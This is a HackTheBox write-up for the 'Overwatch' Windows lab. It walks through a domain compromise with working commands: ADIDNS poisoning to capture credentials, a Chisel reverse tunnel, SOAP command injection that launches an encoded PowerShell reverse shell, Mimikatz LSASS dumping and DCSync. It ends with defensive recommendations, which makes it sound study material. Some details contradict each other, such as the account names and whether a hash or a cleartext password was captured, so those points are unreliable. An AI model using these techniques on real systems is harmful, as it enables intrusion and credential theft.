---
title: "Overwatch"
date: 2026-05-09 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [MSSQL, LinkedServer-Spoofing, Monitoring-Service, SOAP]
description: Writeup for HackTheBox Overwatch machine
image:
  path: assets/img/overwatch/overwatch.png
  alt: HTB Overwatch
---

## Executive Summary

This assessment demonstrates a complete attack chain against a Windows domain environment running a monitoring service. The vulnerability chain includes:

- **Internal SOAP Service**: Command injection in `KillProcess` operation
- **MSSQL Linked Server Exploitation**: Credential capture via ADIDNS poisoning
- **Port Forwarding**: Chisel tunnel to access internal services
- **Mimikatz Post-Exploitation**: LSASS memory dumping for domain credential harvesting

---

## Reconnaissance

### Network Enumeration

#### Initial Port Scan

The reconnaissance phase begins with identifying all open ports on the target system using an aggressive nmap scan. The command dynamically discovers all open ports and performs detailed service enumeration:

```bash
# -p- scans all 65535 ports with high packet rate
# --min-rate 8000 sends packets at maximum speed for faster scanning
# -sC: Run default NSE scripts for service detection
# -sV: Probe open ports to determine service/version info
# -Pn: Skip host discovery (treat all hosts as online)
# -oN: Output results in normal format to scan file
sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN dc2_nmap.scan
```

**Nmap Output:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022
9389/tcp  open  mc-nmf        .NET Message Framing
```

**Key Findings:**
- **Active Directory**: Domain `overwatch.htb` is running with LDAP on port 389
- **Kerberos**: Port 88 indicates AD authentication services
- **SMB**: Port 445 with signing enabled (Windows environment)
- **MSSQL**: SQL Server 2022 on port 6520 (non-standard port)
- **WinRM**: Port 5985 for remote PowerShell sessions

#### Host Configuration

Add discovered hostnames to local `/etc/hosts`:

```bash
# Add target IP with all discovered hostnames
# S200401.overwatch.htb: Primary server hostname
# overwatch.htb: Domain name
# S200401: NetBIOS name for SMB
echo "$ip     S200401.overwatch.htb overwatch.htb S200401" | sudo tee -a /etc/hosts
```

### SMB Enumeration

Verify SMB null authentication and enumerate shares:

```bash
# netexec (crackmapexec) tests credentials against multiple protocols
# Null auth allows anonymous SMB connection
netexec smb $ip
netexec smb $ip -u guest -p '' --shares
```

**Share Enumeration Results:**
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
software$       READ            Non-default share
SYSVOL                          Logon server share
```

**Critical Finding:** The `software$` share is readable by guest account, revealing application files.

---

## Initial Access - MSSQL Exploitation

### Software Share Analysis

Access the `software$` share to find the monitoring application:

```bash
# Connect using smbclient with anonymous credentials
smbclient -U overwatch.htb\\guest%'' //S200401.overwatch.htb/software$

# Download and analyze the overwatch.exe binary
smb: \Monitoring\> get overwatch.exe
```

**Binary Analysis:** The `overwatch.exe` is a .NET assembly that functions as a monitoring service. Using ILSPY for decompilation reveals the application's internal logic and embedded credentials.

<img src="assets/img/overwatch/ilspy.png" alt="ILSPY Decompilation">

**Decompiled Findings:**
- The application connects to MSSQL database `SecurityLogs`
- Uses hardcoded credentials: `sql_svc:TI0LKcfHzZw1Vv`
- Performs URL retrieval and event logging operations

### MSSQL Database Access

Validate credentials and enumerate the database:

```bash
# impacket-mssqlclient connects using Windows authentication
impacket-mssqlclient overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb -port 6520 -windows-auth 

# Discover databases and tables
SELECT name FROM master..sysdatabases
USE overwatch
SELECT table_name FROM information_schema.tables
SELECT * FROM Eventlog
```

**Database Structure:**
- Database: `SecurityLogs` (accessible via `overwatch` database)
- Tables: `Eventlog` (empty)
- Linked Servers: `SQL07` configured but unreachable

### ADIDNS Poisoning Attack

The linked server `SQL07` is configured but doesn't exist in DNS. This creates an opportunity for ADIDNS poisoning:

```bash
# ADIDNS allows users to add DNS records (up to 10 per user)
# Create a malicious DNS record pointing to our attacker machine
./dnstool.py S200401.overwatch.htb -u overwatch\\sqlsvc -p 'TI0LKcfHzZw1Vv' -dc-ip $ip -dns-ip $ip -a add -r SQL07.overwatch.htb -d 10.10.15.113
```

**Attack Explanation:**
1. **ADIDNS Abuse**: Each domain user can create up to 10 DNS records
2. **Linked Server Trigger**: When SQL Server tries to connect to `SQL07`, it resolves the DNS record
3. **Responder Capture**: Responder captures NTLM credentials during the connection attempt

**Credential Capture:**
```
[MSSQL] Cleartext Client   : 10.129.38.246
[MSSQL] Cleartext Hostname : SQL07
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

**Why Linked Server is Required:**
When SQL Server initiates a connection to a linked server, it uses its machine account credentials. Without a configured linked server, the connection attempt wouldn't occur. The linked server configuration triggers the DNS resolution and subsequent credential transmission to our Responder instance.

### User Access

Use captured credentials to establish a foothold:

```bash
# evil-winrm provides PowerShell remoting over WinRM
evil-winrm-py -i $ip -u sqlmgmt -p 'bIhBbzMMnB82yx'

# Capture user flag
cat ..\Desktop\user.txt
# *************1c5a9bdca7265b5467
```

---

## Privilege Escalation - SOAP Service Exploitation

### Internal Service Discovery

With `sqlmgmt` access, discover hidden internal services:

```powershell
# netstat enumerates all listening ports
netstat -ano | findstr TCP

# Identify process listening on port 8000
tasklist | findstr 4796
```

**Key Finding:** Process ID 4796 is running a service on port 8000, bound only to localhost (127.0.0.1).

### Port Forwarding with Chisel

Establish a reverse tunnel to access the internal service:

```bash
# Step 1: Upload Chisel binary to target
upload /home/kali/Pentesting/Tools/chisel_1.11.3.exe chisel.exe

# Step 2: Start Chisel server in reverse mode on attack machine
# Reverse mode: target connects back to us, we provide the service
./chisel_1.11.3 server --reverse --port 4000

# Step 3: From target, connect back to establish the tunnel
# R:8000:127.0.0.1:8000 creates reverse forward from local 8000 to remote 8000
./chisel client 10.10.15.113:4000 R:8000:127.0.0.1:8000
```

**Chisel Architecture:**
- **Server Mode**: Listens for incoming connections on port 4000
- **Reverse Mode**: Client connects to server, creating a tunnel back to the target
- **Port Mapping**: Local port 8000 forwards all traffic to target's 127.0.0.1:8000

### SOAP Service Enumeration

The internal service is a SOAP web service running on HTTP.sys (Windows kernel-mode HTTP listener):

```powershell
# netsh shows registered URL reservations
netsh http show servicestate

# WSDL reveals available operations
curl -s 'http://localhost:8000/MonitorService?wsdl' | xq
```

**Available Operations:**
1. **StartMonitoring** - Starts monitoring service
2. **StopMonitoring** - Stops monitoring service  
3. **KillProcess** - Kills a process by name (parameter: `processName`)

### Command Injection Exploitation

The `KillProcess` operation is vulnerable to command injection. The backend executes:

```powershell
Stop-Process -Name <user_input> -Force
```

**Exploitation Steps:**

1. **Initial Testing** - Verify command execution:
```bash
curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad ; ping 10.10.15.113 #</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>'
```

2. **PowerShell Reverse Shell** - Craft payload with proper encoding:
```bash
# Encode payload in UTF-16LE then base64 for PowerShell execution
# The payload creates a TCP client, connects back, and provides an interactive shell
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($powershell_payload))
```

3. **Execute Shell**:
```bash
curl -s -X POST http://localhost:8000/MonitorService \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"' \
  -d '<soap:Envelope>...<tns:processName>notepad ; powershell -nop -W hidden -noni -ep bypass -enc $encoded #</tns:processName>...</soap:Envelope>'
```

**Root Cause Analysis:**
The vulnerability exists because the application:
1. Direct string concatenation of user input into PowerShell commands
2. No input validation or sanitization
3. No use of PowerShell's safe command invocation (e.g., `Start-Process` with argument list)
4. The `-Force` parameter is appended after user input, allowing comment-based bypass

---

## Post-Exploitation - Credential Harvesting

### Mimikatz Execution

With SYSTEM access, dump domain credentials from LSASS memory:

```powershell
# Privilege escalation to debug level (required for LSASS access)
.\m.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
```

**Mimikatz Output Analysis:**

| Username | Domain | NTLM Hash | Password |
|----------|--------|-----------|----------|
| S200401$ | OVERWATCH | `1b0de87727db8880deb1ad234370181a` | (null) |
| Administrator | OVERWATCH | `269fa056205bbf5d47fc2c3682dbbce6` | `ReinhardHammer507` |

**Credential Types Found:**
- **MSV**: Microsoft's Authentication Package (username, domain, NTLM hash)
- **Kerberos**: Ticket-granting credentials for domain authentication
- **WDigest**: Web Digest authentication (plaintext passwords for older protocols)
- **DPAPI**: Data Protection API secrets

### DC Synchronization

Extract all domain hashes using DCSync:

```bash
# secretsdump performs DCSync against the domain controller
impacket-secretsdump overwatch.htb/'S200401$'@S200401.overwatch.htb -hashes ':1b0de87727db8880deb1ad234370181a' -dc-ip $ip
```

**Root Flag:**
```
PS C:\Users\Administrator\Desktop> cat root.txt
# ************94a907a8d737363319
```

---

## Summary

### Attack Chain:
1. **Null Authentication**: SMB guest access revealed application files
2. **Binary Analysis**: Decompiled .NET assembly exposed MSSQL credentials
3. **ADIDNS Poisoning**: Leveraged linked server misconfiguration to capture machine account hash
4. **MSSQL Access**: Authenticated as `sqlmgmt` user
5. **Internal Service Discovery**: Found hidden SOAP service on localhost:8000
6. **Port Forwarding**: Used Chisel to tunnel to internal service
7. **SOAP Exploitation**: Command injection in `KillProcess` operation
8. **Privilege Escalation**: Shell executed with SYSTEM privileges
9. **Credential Harvesting**: Dumped domain credentials with Mimikatz
10. **Domain Compromise**: Captured root flag and extracted all hashes

### Vulnerability Chain:
1. **Weak Permissions**: Guest-readable share exposing application binaries
2. **Hardcoded Credentials**: .NET binary contained plaintext database passwords
3. **ADIDNS Misconfiguration**: Users can create DNS records enabling poisoning
4. **Linked Server Exposure**: SQL Server attempts connection with machine account
5. **Command Injection**: SOAP service concatenates user input directly into PowerShell
6. **Privilege Misconfiguration**: HTTP service running as SYSTEM

### Recommendations:
1. **Remove Guest Access**: Restrict SMB shares to authenticated users only
2. **Secure Credentials**: Store passwords in secure vaults, never in binaries
3. **Disable ADIDNS Self-Registration**: Restrict DNS record creation for regular users
4. **Remove Unused Linked Servers**: Clean up orphaned database connections
5. **Implement Input Validation**: Sanitize all user inputs in SOAP services
6. **Use PowerShell Constrained Language**: Limit PowerShell execution in services
7. **Run Services as Least Privilege**: Avoid SYSTEM context for network services
8. **Enable SMB Signing**: Already enabled, maintain this security control
9. **Monitor for LSASS Access**: Alert on unauthorized process access to LSASS
